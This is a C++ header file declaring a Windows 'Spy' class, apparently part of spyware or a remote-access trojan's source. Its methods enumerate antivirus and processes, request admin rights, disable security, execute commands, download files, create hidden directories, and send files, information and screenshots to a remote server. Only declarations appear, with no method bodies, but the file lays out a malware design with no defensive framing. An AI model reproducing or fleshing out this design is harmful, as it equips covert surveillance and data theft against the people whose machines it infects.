#pragma once

#include<iostream>
#include<filesystem>
#include<vector>
#include<Windows.h>
#include<restclient-cpp/restclient.h>

class Spy
{
public:
	Spy(std::string server,std::filesystem::path base);
	~Spy();
	
	std::filesystem::path GetWindowPath(int);

	bool Execute(std::string cmd);
	std::string Command(std::string);
	std::vector<std::string> ListAntiVirus();
	std::vector<std::string> ListProcess();

	bool RequestAdmin(LPCTSTR privilege);
	bool DisableSecurity();

	bool Download(std::string name,std::string url);

	bool S_CreateDir(std::filesystem::path name,bool hidden);
	bool S_CreateFile(std::filesystem::path name);
	std::vector<std::filesystem::directory_entry> GetFileList(std::filesystem::path);

	void SetServer(std::string url);
	std::string GetServer();

	std::string RequestServer();
	RestClient::Response SendInformation(std::string data);
	RestClient::Response SendFile(std::string, std::filesystem::path);
	RestClient::Response SendScreenShot();
private:
	int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
	std::filesystem::path base;
	std::string server;

};

